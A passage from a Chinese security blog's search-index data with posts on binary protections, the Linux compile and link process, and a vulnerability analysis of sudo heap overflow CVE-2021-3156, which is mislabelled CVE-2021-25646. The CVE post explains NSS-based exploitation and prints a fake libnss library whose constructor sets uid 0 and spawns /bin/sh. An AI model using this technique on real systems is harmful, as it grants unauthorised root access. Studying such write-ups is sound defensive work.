FORTIFYFORTIFY机制用于检查程序是否存在缓冲区溢出错误。这是一个由GCC实现的源码级别的保护机制，其功能是在编译的时候检查源码以避免潜在的缓冲区溢出等错误。适用于memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets等函数。 在函数编译时，加入FORTIFY机制的代码会在编译过程中自动添加一部分代码，判断数组的大小，削减缓冲区溢出的危害。 gcc编译时，默认不开启FORTIFY机制，可通过编译选项选择开启的FORTIFY机制强度 NXNX:no-excute不可执行 基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 PIE（ASLR）PIE一般与ASLR地址分布随机化(address space layout randomization)同时工作 内存地址随机化机制几种情况：1230 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。 RELRORELRO:read only relocation 由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读. 作用：设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。 Summary了解以上内存保护机制的信息会为我们pwn提供一些信息。","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"程序保护机制","slug":"程序保护机制","permalink":"http://example.com/tags/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"}]},{"title":"Linux代码编译过程","slug":"Linux环境下编译过程","date":"2021-04-11T16:05:33.539Z","updated":"2021-04-11T16:05:11.515Z","comments":true,"path":"2021/04/12/Linux环境下编译过程/","link":"","permalink":"http://example.com/2021/04/12/Linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/","excerpt":"","text":"Linux下Hello World的前生今世代码引入hello.c 1234567#include &lt;stdio.h&gt;int main(int argc,char *argv[],char *envp[])&#123; printf(&quot;Hello World\\n&quot;); return 0;&#125; linux环境下我们可以通过GCC编译hello.c: 1$ gcc -g hello.c -o hello 当前目录先会生成hello可执行文件。 main函数的三个参数int argc int型变量，表示传递给main函数的参数数量。 char *argv 指针数组，每个指针指向各个具体的参数。 char*envp 环境变量，可以为程序运行过程中需要使用环境变量做参考。 Demo: 1$ ./hello //执行该文件 此时argc=1,表示只有一个参数输入 argv只有一个元素,argv[0]指向输入程序路径及名称: ./hello 1$ ./hello para_1 此时argc=2,有两个参数传入 argc[0]指向输入程序路径及名称 “./hello” argv[1]指向para_1字符串 what’s gccGCC是GNU Compiler Collection的缩写，GCC是一系列编译器的集合，是Linux操作系统的核心组件之一。GCC最初名为GNU C Compiler，当时它只是一款C语言的编译器，不过随着后续迭代，它支持C++、Fortran、Go等语言，GCC也因此成为一个编译器集合。GCC有以下特点： GCC支持的编程语言多。比如，g++是C++编译器，gfortran是Fortran编译器。 GCC支持的硬件全。GCC可以将源代码编译成x86_64、ARM、PowerPC等硬件架构平台的可执行文件。 GCC支持众多业界标准。GCC能很快支持最新的C++标准，GCC支持OpenMP、OpenACC。 编译过程分析 预处理预处理器CPP工具进行预处理 1$ cpp hello.c -o hello.i 预编译主要处理源代码中以#开始的预编译指令，主要处理规则如下： 处理#include 预编译指令，将被包含的文件插入到该预编译指令的位置。这是一个递归的过程，如果被包含的文件还包含了其他文件，会递归地完成这个过程。 处理条件预编译指令，比如#if、#ifdef、#elif、#else、#endif。 删除#define，展开所有宏定义。 添加行号和文件名标识，以便于在编译过程中产生编译错误或者调试时都能够生成行号信息。 编译gcc对预处理后的hello.i文件惊醒编译。编译的过程主要是进行词法分析、语法分析、语义分析，这背后涉及编译原理等一些内容。这里只进行编译，不汇编，可以生成硬件平台相关的汇编语言。 1$ gcc -S hello.i -o hello.s 它包含一个汇编语言程序，即将C语言程序编译成汇编语言程序。 汇编1$ as hello.s -o hello.o as工具将hello.s文件翻译为二进制代码。 虽然这个文件已经是二进制的机器码了，但是它仍然不能执行，因为它缺少系统运行所必须的库，比如C语言printf()对应的汇编语言的puts函数。确切的说，系统还不知道puts函数在内存中的具体位置。如果我们在一份源代码中使用了外部的函数或者变量，还需要重要的一步：链接。 链接1$ gcc hello.o -o hello 该命令是基于动态链接的方式，生成的hello已经是一个可执行文件。实际上，这个命令隐藏了很多背后的内容。 main()方法是C语言程序的入口，crt1.o这几个库是在处理main()方法调用之前和程序退出之后的事情，这需要与操作系统协作。在Linux中，一个新的程序都是由父进程调用fork()，生成一个子进程，然后再调用execve()，将可执行文件加载进来，才能被操作系统执行。所以，准确地说，main()方法是这个程序的入口，但仅仅从main()方法开始，并不能顺利执行这个程序。 链接器将多个目标文件合并成一个可执行目标文件，这个二进制文件包含加载程序到内存并运行的所有信息。 链接过程主要包含了两个步骤： 地址与空间分配（Address and Storage Allocation） 这个过程中， 扫描所有的输入目标文件，获得它们的各个节的长度、属性、位置，并将输入目标文件中的符号表中所有的符号定义和符号引用收集起来，统一放到一个全局的符号表。这一步，链接器能够获得所有输入目标文件的节的长度，并将它们合并，计算出输出文件中各个节合并后的长度与位置，并建立映射关系。 这里引入可执行目标文件的概念。 .text:已编译程序的机器代码 .rodata:只读数据 .data:已初始化的全局和静态C变量 .bss:未初始化的全局和静态C变量 .symtab: 符号表，存放在程序中定义和引用的函数和全局变量的信息 .debug:调试符号表 可执行文件中的段是由目标文件中的节合并而来的，以下是链接器如何将它们的各个节合并到输出文件，也即输出文件中的空间如何分配给输入文件的两种方式。 顺序叠加 虽然这种方法非常简单，但是它存在一个问题：在有很多输入文件的情况下，输出文件会有很多零散的节。这种做法非常浪费空间，因为每个节都需要有一定的地址和空间对齐要求。x86硬件的对齐要求是4KB。如果一个节的大小只有1个字节，它也要在内存在重用4KB。这样会造成大量内部碎片。所以不是一个好的方案。 合并相似节 一个更加实际的方法便是合并相同性质的节，比如：将所有输入文件的 .text节合并到输出文件的 text段（注意，此时出现了段和节两个概念），如下图所示。 其中.bss节在目标文件和可执行文件中不占用文件的空间，但是它在装载时占用地址空间。事实上，这里的空间和地址有两层含义: 在输出的可执行文件中的空间 在装载后的虚拟地址中的空间 对于有实际数据的节，如.text和.data，它们在文件中和虚拟地址中都要分配空间，因为它们在这两者中都存在；对于.bss来，分配空间的意义只局限于虚拟地址空间，因为它在文件中并没有内容。我们在这里谈到的空间分配只关注于虚拟地址空间（见下图）的分配，因为这关系到链接器后面的关于地址计算的步骤，而可执行文件本身的空间分配与链接的关系并不大。 现在的链接器空间分配的策略基本上都采用“合并相似节”的方法，使用这种方法的链接器一般采用一种叫 两步链接（Two-pass Linking） 的方法。即整个链接过程分为地址与空间分配和符号解析、重定位。 符号解析（Symbol Resolution）和重定位（Relocation） 使用前一步中收集到的所有信息，读取输入文件中节的输数据、重定位信息，并且进行符号解析与重定位、调整代码、调整代码中的地址等。重定位是链接过程的核心。在地址与空间分配步骤完成之后，相似权限的节会被合并成段，并生成了 程序头表（Program Header Table） 结构。如下图可执行文件结构所示，主要生成两个段：代码段（ text段）、数据段（ data段 ）。 符号解析 重定位的过程是伴随着符号解析的，这里先介绍符号解析。 链接器解析符号引用的方法是将每个引用与它输入的可重定位目标文件的符号表中的一个确定的符号定义关联起来。对那些和引用定义在相同模块的局部符号的引用，符号解析是非常简单的。编译器只允许每个模块中每个局部符号有一个定义。静态局部变量也会有本地链接器符号，编译器还要确保它们拥有唯一的名字。 然而，对于全局符号的解析要复杂得多。当编译器遇到一个不是在当前模块中定义的符号（变量或函数名）时，会假设该符号是在其他某个模块中定义的，生成一个链接器符号表条目，并把它交给链接器处理。如果链接器在它的任何输入模块中都找不到这个被引用符号的定义，就输出一条错误信息并终止。 多重定义的全局符号解析在此不做介绍。 重定位 链接的前两步完成之后，链接器就已经确定所有符号的虚拟地址了，那么链接器就可以根据符号的地址对每个需要重定位的指令进行地址修正。 那么链接器如何知道哪些指令是要被调整的呢？事实上，我们前面提到的ELF文件中的 重定位表（Relocation Table） 专门用来保存这些与重定位相关的信息。 对于可重定位的ELF文件来说，它必须包含重定位表，用来描述如何修改相应的节的内容。对于每个要被重定位的ELF节都有一个对应的重定位表。如果.text节需要被重定位，则会有一个相对应叫.rel.text的节保存了代码节的重定位表；如果.data节需要被重定位，则会有一个相对应的.rel.tdata的节保存了数据节的重定位表。 链接可分为静态链接和动态链接 静态链接简单来说，静态链接就是在程序加载前，将所依赖的第三方库函数都打包到了一起，形成一个非常大的可执行文件。如下图所示为最基本的静态链接过程示意图。每个模块的源代码文件（如.c）文件经过编译器编译成目标文件（Object File，一般扩展名为.o或.obj）。目标文件和 库（Library） 一起链接形成最终的可执行文件。其中，最常见的库就是运行时库（Runtime Library），它是支持程序运行的基本函数的集合。库本质上是一组目标文件的包，由一些最常用的代码编译成目标文件后打包而成。 动态链接动态链接是在运行时，发现用到某些库中的某些函数时，再从这些第三方库中读取自己所需的方法。 动态链接的基本实现 动态链接涉及运行时的链接以及多个文件的装载，必需要有操作系统的支持。因为动态链接的情况下，进程的虚拟地址空间的分布会比静态链接情况下更为复杂，还有一些存储管理、内存共享、进程线程等机制在动态链接下也会有一些微妙的变化。 目前，主流操作系统都支持动态链接。在Linux中，ELF动态链接文件被称为 动态共享对象（DSO，Dynamic Shared Objects），一般以.so为后缀；在Windows中，动态链接文件被称为 动态链接库（Dynamic Linking Library），一般以.dll为后缀。 在Linux中，常用的C语言库的运行库glibc，其动态链接形式的版本保留在 /lib目录下，文件名为 libc.so。整个系统只保留一份C语言动态链接文件libc.so，所有的C语言编写的、动态链接的程序都可以在运行时使用它。当程序被装载时，系统的动态链接器会将程序所需要的所有动态链接库装载到进程的地址空间，并将程序中所有未解析的符号绑定到相应的动态链接库中，并进行重定位。 动态链接程序运行时地址空间分布 对于静态链接的可执行文件来说，整个进程只有一个文件要被映射，即可执行文件。而对于动态链接，除了可执行文件，还有它所依赖的共享目标文件。 关于共享目标文件在内存中的地址分配，主要有两种解决方案，分别是： 静态共享库（Static Shared Library）（地址固定） 动态共享库（Dynamic Shared Libary）（地址不固定） 静态共享库 静态共享库的做法是将程序的各个模块统一交给操作系统进行管理，操作系统在某个特定的地址划分出一些地址块，为那些已知的模块预留足够的空间。因为这个地址对于不同的应用程序来说，都是固定的，所以称之为静态。 但是静态共享库的目标地址会导致地址冲突、升级等问题。 动态共享库 采用动态共享库的方式，也称为装载时重定位（Load Time Relocation）。其基本思路是：在链接时，对所有绝对地址的引用都不作重定位，而把这一步推迟到装载时再完成。一旦模块装载地址确定，即目标地址确定，那么系统就对程序中所有的绝对地址引用进行重定位。 但是这种方式也存在一些问题。比如，动态链接模块被装载映射至虚拟空间后，指令部分是在多个进程间共享的，由于装载时重定位的方法需要修改指令，所以没有办法做到同一份指令被多个进程共享，因为指令被重定位后对于每个进程来说都是不同的。 然后，动态链接库中的代码是共享的，但是其中的可修改数据部分对于不同进程来说是由多个副本的。基于此，一种名为地址无关代码的技术被提出以克服这个问题。 与地址无关 无论何种操作系统上，使用动态链接生成的目标文件中凡是涉及第三方库的函数调用都是地址无关的。我们自己编写的程序名为hello.c，hello.c中调用了C标准库的printf()，在生成的目标文件中，不会立即确定printf()的具体地址，而是在运行时去装载这个函数，在装载阶段确定printf()的地址。这里提到的地址指的是进程在内存上的虚拟地址。动态链接库的函数地址在编译时是不确定的，在装载时，装载器根据当前地址空间情况，动态地分配一块虚拟地址空间。 小结在会写一个C程序，也要了解一个C代码是如何从ASCII文件一步步变为可执行文件的过程。","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"编译过程","slug":"编译过程","permalink":"http://example.com/tags/%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"},{"name":"链接","slug":"链接","permalink":"http://example.com/tags/%E9%93%BE%E6%8E%A5/"}]},{"title":"CVE-2021-25646堆溢出漏洞复现及分析","slug":"CVE-2021-3156","date":"2021-04-10T03:26:10.677Z","updated":"2021-04-10T06:32:38.500Z","comments":true,"path":"2021/04/10/CVE-2021-3156/","link":"","permalink":"http://example.com/2021/04/10/CVE-2021-3156/","excerpt":"","text":"CVE-2021-25646堆溢出漏洞复现及分析漏洞详情​ 当在类Unix的操作系统上执行命令时，非root用户可以使用sudo命令来以root用户身份执行命令。由于sudo错误地在参数中转义了反斜杠导致堆缓冲区溢出，从而允许任何本地用户（无论是否在sudoers文件中）获得root权限，无需进行身份验证，且攻击者不需要知道用户密码。 ​ 影响范围： ​ Sudo 1.8.2 - 1.8.31p2 ​ Sudo 1.9.0 - 1.9.5p1 漏洞原理分析​ 对于bash而言假如我们希望执行某个命令可以使用bash -c [command]来执行，如果我们希望以root的权限去执行某个命令的话可以直接sudo [cmd]，而如果我们希望以shell模式去执行某个命令的时候，可以使用sudo -i或者sudo -s参数，在参数说明里我们可以看到-i, --login run login shell as the target user; a command may also be specified， -s, --shell run shell as the target user; a command may also be specified，当我们使用上述参数时对于sudo的flags而言有两种情况： 使用sudo -s，设置MO DE_SHELL 使用sudo -i，设置MODE_SHELL|MODE_LOGIN_SHELL ​ 在src/parse_args.c里我们可以看到对于这种模式的参数处理，处理方式为将参数按照空格拼接起来，对于一些元字符使用反斜线进行转义处理，最终覆写了argv为ac这个指针数组。 ​ 源码分析： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/* * For shell mode we need to rewrite argv */ if (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123; char **av, *cmnd = NULL; int ac = 1; if (argc != 0) &#123; /* shell -c &quot;command&quot; */ char *src, *dst; //得到命令的长度 size_t cmnd_size = (size_t) (argv[argc - 1] - argv[0]) + strlen(argv[argc - 1]) + 1; cmnd = dst = reallocarray(NULL, cmnd_size, 2); if (cmnd == NULL) sudo_fatalx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); if (!gc_add(GC_PTR, cmnd)) exit(1); //拼接命令并且处理转移符 for (av = argv; *av != NULL; av++) &#123; for (src = *av; *src != &#x27;\\0&#x27;; src++) &#123; /* quote potential meta characters */ if (!isalnum((unsigned char)*src) &amp;&amp; *src != &#x27;_&#x27; &amp;&amp; *src != &#x27;-&#x27; &amp;&amp; *src != &#x27;$&#x27;) *dst++ = &#x27;\\\\&#x27;;//处理转义字符，&#x27;\\\\&#x27;表示反斜线 *dst++ = *src; &#125; *dst++ = &#x27; &#x27;; &#125; if (cmnd != dst) dst--; /* replace last space with a NUL */ *dst = &#x27;\\0&#x27;; ac += 2; /* -c cmnd */ &#125; //上述处理完毕后结果保存在dst指针指向的内存 av = reallocarray(NULL, ac + 1, sizeof(char *)); //分配新的内存保存拼接的命令 if (av == NULL) sudo_fatalx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); if (!gc_add(GC_PTR, av)) exit(1); av[0] = (char *)user_details.shell; /* plugin may override shell */ if (cmnd != NULL) &#123; av[1] = &quot;-c&quot;; av[2] = cmnd; &#125; av[ac] = NULL; //最后的形式为 shell -c cmnd(shell和环境变量相关，比如我这里是zsh，shell为/usr/bin/zsh) //最终用av覆写argv argv = av; argc = ac; &#125; ​ 随后在sudoers.c中的sudoers_policy_main函数中调用set_cmnd将命令行参数存放在一个堆上的数据结构user_args中，这里也对元字符做了处理，假如不是\\\\+space的形式就跳过元字符，否则拷贝到*to。那么假如我们的命令行参数以\\\\结尾，那么from[0]=&#39;\\\\&#39;;from[1]=NULL(注意NULL并非sapce范围)，此时from++指向空字符，下面将空字符拷贝到了*to并且from++后执行了NULL后面的字符，此时再次进行while循环判断时很明显这里是可以继续进入循环的(如果后一个字符不为NULL)，从而赋值得以继续进行，从而产生了溢出。 1234567891011121314151617if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; /* * When running a command via a shell, the sudo front-end * escapes potential meta chars. We unescape non-spaces * for sudoers matching and logging purposes. */ for (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123; while (*from) &#123; if (from[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)from[1])) from++; *to++ = *from++; &#125; *to++ = &#x27; &#x27;; &#125; *--to = &#x27;\\0&#x27;; &#125; set_cmnd()存在越界写，溢出user_args堆缓冲区（size是在852-853行中计算）。根本原因就是，sudo默认 \\ 后面肯定跟着元字符，实际上后面只有1个结束符。 当from指向\\时，from[1]指向NULL字节，from[2]指向的就是环境变量的第一个字节了，执行*too=*from++，可以将后面的NULL字节拷贝到user_args的堆中，且让from++，从而避开了while(*from）判断是否读到NULL字节的检测，由于参数后面紧跟环境变量的值，因此通过设置环境变量的值来覆盖user_args堆后面的数据。 ​ 上述是我们的理论分析，在理论角度上看漏洞是存在的，但是我们在之前的漏洞中也见到过由于无法创造漏洞利用场景(比如我想提权但是exp里需要某个root用户给的capability)，这样的洞就非常鸡肋。那么在我们的分析里有几个理想条件，那么最后的这个场景，即反斜线作为cmd-line的最后一个字符从理论上来说是无法实现的，这里要求我们有MODE_SHELL|MODE_LOGIN_SHELL，而假如flag包含MODE_SHELL的话在我们之前的parse_args参数解析中就会将所有元字符给转义掉，也就是说会有两个反斜线，我们再按照代码走一遍会发现这样循环末尾的*from=NULL，因此会跳出循环。 ​ 再仔细对比一下二者的条件，二者的条件略有不同。我们的问题在于能否设置flag为MODE_SHELL以及MODE_RUN或者MODE_EDIT或者MODE_CHECK。 ​ 再看下解析参数的部分会发现好像还是不太行，假如我们使用-e参数设置MODE_EDIT或者使用-l参数设置MODE_CHECK，我们的MODE_SHELL参数就会被从valid_flags去掉。 12345678910//bug conditionif (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; //... if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; &#125;&#125;//escape meta char conditionif (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123; //.. &#125; 1234567891011121314151617181920212223242526#define MODE_NONINTERACTIVE 0x00800000#define MODE_SHELL 0x00020000//parse_args.ccase &#x27;e&#x27;: if (mode &amp;&amp; mode != MODE_EDIT) usage_excl(1); mode = MODE_EDIT; sudo_settings[ARG_SUDOEDIT].value = &quot;true&quot;; valid_flags = MODE_NONINTERACTIVE;//这里 break; //...case &#x27;l&#x27;: if (mode) &#123; if (mode == MODE_LIST) SET(flags, MODE_LONG_LIST); else usage_excl(1); &#125; mode = MODE_LIST; valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;//这里 //...if ((flags &amp; valid_flags) != flags) usage(1); ​ 最后作者发现了一个可以利用的地方(盲猜是通过全局搜flag找到的)，那就是如果我们去执行sudoedit，parse_args函数会自动设置MODE_EDIT，并且不会重置valid_flags，而valid_flags默认包含了MODE_SHELL。 123456789101112131415/* * Default flags allowed when running a command. */#define DEFAULT_VALID_FLAGS (MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)int valid_flags = DEFAULT_VALID_FLAGS; /* First, check to see if we were invoked as &quot;sudoedit&quot;. */ proglen = strlen(progname); if (proglen &gt; 4 &amp;&amp; strcmp(progname + proglen - 4, &quot;edit&quot;) == 0) &#123; progname = &quot;sudoedit&quot;; mode = MODE_EDIT; sudo_settings[ARG_SUDOEDIT].value = &quot;true&quot;; &#125; ​ 也就是说，加入我们执行sudoedit -s，就同时兼具了MODE_SHELL|MODE_EDIT而没有MODE_RUN，因此可以成功到达漏洞点。 一个溢出demo： 1.堆溢出分析1.堆在内存中的位置 2.堆的结构 arena：通过sbrk或mmap系统调用为线程分配的堆区，按线程的类型可以分为2类： main arena：主线程建立的arena； thread arena：子线程建立的arena； bin：一个用以保存Free chunk链表的表头信息的指针数组，按所悬挂链表的类型可以分为4类: Fast bin：Fast bin 共有10个，存储了chunk size 从16到80的free chunk，这些free chunk被称作fast chunk Unsorted bin：当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中。 Small bin：小于512字节的chunk称之为small chunk，small bin就是用于管理small chunk的。 Large bin：大于512字节的chunk称之为large chunk，large bin就是用于管理这些large chunk的。 PS:libc2.26 之后的 Tcache 机制 Tcache bin :类似于fastbin一样的东西，每条链上最多可以有 7 个 chunk，free的时候当tcache满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找。 区别：Max fast bins size is 0x80. Max tcache bins size is 0x410 mutex：互斥锁，防止多线程对chunk资源的竞争 Large bin： chunk：逻辑上划分的一小块内存，根据作用不同分为4类： Allocated chunk：即分配给用户且未释放的内存块； Free chunk：即用户已经释放的内存块； Top chunk：处于一个arena的最顶部的chunk Last Remainder chunk：对small bin的malloc机制的介绍中当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，再将该新的chunk变成新的last remainder chunk。 标志位： A:记录当前chunk是否属于主线程 M:记录当前chunk是否是由mmap分配 P:记录前一个chunk块是否被分配 Malloc Algorithm： 1.若malloc请求大小与tcache中某个chunk大小完全匹配，优先从tcache bins调用而不必向large bin发出请求。 2.若请求内存足够大，则调用mmap()直接向操作系统从内存中调用 3.若fast bin中有合适大小的块，则先从中分配 TO be continued…. Free Algorithm： 1.若tcache bins有空间，则优先将空闲块放入其中 2.如果块足够小，则优先放入fast bins中 TO be continued…. 从该调度算法可以看出，某个具体大小的chunk可以在tcache bins 中稳定存在一定时间并且不发生合并，这个机制可以为我们精准溢出到某个结构体前面附近提前进行占位。 漏洞利用思路：利用溢出覆写nss_library为X/X，从而加载自定义的库函数，进而get root shell。 知识背景： 1.glibc setlocalemain()函数较早调用了setlocale()函数，查阅源码我们发现此处进行了malloc操作，这样可以分配并释放几个LC环境变量（LC_CTYPE，LC_MESSAGES，LC_TIME等），这样就在Sudo的堆开头处留下了空闲的fast/tcache chunks 12345678// /src/sudo.c150: int main(int argc, char *argv[], char *envp[])151: &#123; ...171: setlocale(LC_ALL, &quot;&quot;); ...216: sudo_mode = parse_args(argc, argv, &amp;submit_optind, &amp;nargc, &amp;nargv, &amp;settings, &amp;env_add); 总之我们可以通过设置环境变量对堆进行修饰，得到指定大小的空闲chunk 并且该块在NSS结构体之前。由malloc机制不难分析出，我们控制好溢出大小很容易在tcache或者fast bins中占有该空闲块。 2.NSS（Name Service Switch）​ 每个Linux/Unix的操作系统中都有这样的一套称之为NSS的共享库来做一些解析，比如登录用户的用户名以及IP地址到域名的解析。比如对于DNS服务来说，它默认查看/etc/resolv.conf配置文件的内容进行解析，对于用户和组来说，它会默认查看/etc/passwd和/etc/group。其配置文件位于/etc/nsswitch.conf，其每行都规定了查找方法的规范，在GNU C Library里, 每个可用的SERVICE都必须有文件 /lib/libnss_SERVICE.so.1 与之对应。****也就是说，GNU将每个服务实现为不同的module(shared library)，因此可以在Linux系统中找到下列相应的共享库。** 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// 1. service_user 结构typedef struct service_user&#123;/* And the link to the next entry. */struct service_user *next;/* Action according to result. */lookup_actions actions[5];/* Link to the underlying library object. */service_library *library;/* Collection of known functions. */void *known;/* Name of the service (`files&#x27;, `dns&#x27;, `nis&#x27;, ...). */char name[0];&#125; service_user;// 2. nss_load_library() 函数static int nss_load_library (service_user *ni)&#123;if (ni-&gt;library == NULL) &#123; static name_database default_table; ni-&gt;library = nss_new_service (service_table ?: &amp;default_table, // （1）设置 ni-&gt;library ni-&gt;name); if (ni-&gt;library == NULL) return -1; &#125;if (ni-&gt;library-&gt;lib_handle == NULL) &#123; /* Load the shared library. */ size_t shlen = (7 + strlen (ni-&gt;name) + 3 + strlen (__nss_shlib_revision) + 1); int saved_errno = errno; char shlib_name[shlen]; /* Construct shared object name. */ __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name, // （2）伪造的库文件名必须是 libnss_xxx.so &quot;libnss_&quot;), ni-&gt;name), &quot;.so&quot;), __nss_shlib_revision); ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name); // （3）加载目标库 //continue long long function 分析代码可知：如果溢出后可以覆盖service_user结构。该结构出现在libc的nss_load_library()函数中，用于加载动态链接库。如果能覆盖service_user-&gt;name，就能指定加载我们伪造的库，利用root权限运行非root权限的库。 我们要做的就是利用溢出部分将ni-&gt;library == null，所以找到距离我们占位块最近的一个service_user结构体即可。 gdb调试技巧： search -s systemd 和 search -s mymachine 定位出现的结构体，找到位置最合适的一个。 Demo: 最后一步：伪造libnss_X/X.so.2库 Demo: 12345678910111213141516#include &lt;stdlib.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;static int __attribute__((constructor)) ___init(void)&#123; char *argv[2] = &#123;&quot;sh&quot;, NULL&#125;; setuid(0); setgid(0); seteuid(0); setegid(0); return execve(&quot;/bin/sh&quot;, argv, NULL);&#125; 加载该库函数即可get shell. 总结基本思路是：通过输入特定环境变量，使得释放特定大小LC_ALL变量堆块占位到service_user结构体上方为目标来进行，使得service结构体加载自定义库函数。 在阅读Qualys的报告时注意到，在寻找利用点时使用了fuzz的方法，找到了三个较为稳定的利用点，这点值得以后深入了解。","categories":[{"name":"CVE","slug":"CVE","permalink":"http://example.com/categories/CVE/"}],"tags":[{"name":"堆溢出","slug":"堆溢出","permalink":"http://example.com/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"name":"CVE-2021-3156","slug":"CVE-2021-3156","permalink":"http://example.com/tags/CVE-2021-3156/"}]},{"title":"Hello World","slug":"hello_world","date":"2021-04-08T03:20:01.320Z","updated":"2021-04-08T17:06:24.341Z","comments":true,"path":"2021/04/08/hello_world/","link":"","permalink":"http://example.com/2021/04/08/hello_world/","excerpt":"","text":"一个新的开始 “我所有的欲望和沉思，都是这个宇宙缓缓呼出的气流。在这漫长的呼气结束之前，我的思维将一直存在。” ​ 几经周折终于面前搭建好了属于自己的博客，一个属于自己的空间。长久以来，我与外界的关系是作为一个消费者，消费物质和内容。2021年希望自己可以做一个生产者，创作者，把博客作为方法，输出和记录一些内容。 :) Hello world.","categories":[{"name":"my_space","slug":"my-space","permalink":"http://example.com/categories/my-space/"}],"tags":[{"name":"say_something","slug":"say-something","permalink":"http://example.com/tags/say-something/"}]}],"categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"},{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"},{"name":"Web","slug":"Web","permalink":"http://example.com/categories/Web/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"},{"name":"CVE","slug":"CVE","permalink":"http://example.com/categories/CVE/"},{"name":"my_space","slug":"my-space","permalink":"http://example.com/categories/my-space/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"ELF文件","slug":"ELF文件","permalink":"http://example.com/tags/ELF%E6%96%87%E4%BB%B6/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"PE文件","slug":"PE文件","permalink":"http://example.com/tags/PE%E6%96%87%E4%BB%B6/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"http://example.com/tags/Web/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"程序保护机制","slug":"程序保护机制","permalink":"http://example.com/tags/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"},{"name":"编译过程","slug":"编译过程","permalink":"http://example.com/tags/%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"},{"name":"链接","slug":"链接","permalink":"http://example.com/tags/%E9%93%BE%E6%8E%A5/"},{"name":"堆溢出","slug":"堆溢出","permalink":"http://example.com/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"name":"CVE-2021-3156","slug":"CVE-2021-3156","permalink":"http://example.com/tags/CVE-2021-3156/"},{"name":"say_something","slug":"say-something","permalink":"http://example.com/tags/say-something/"}]}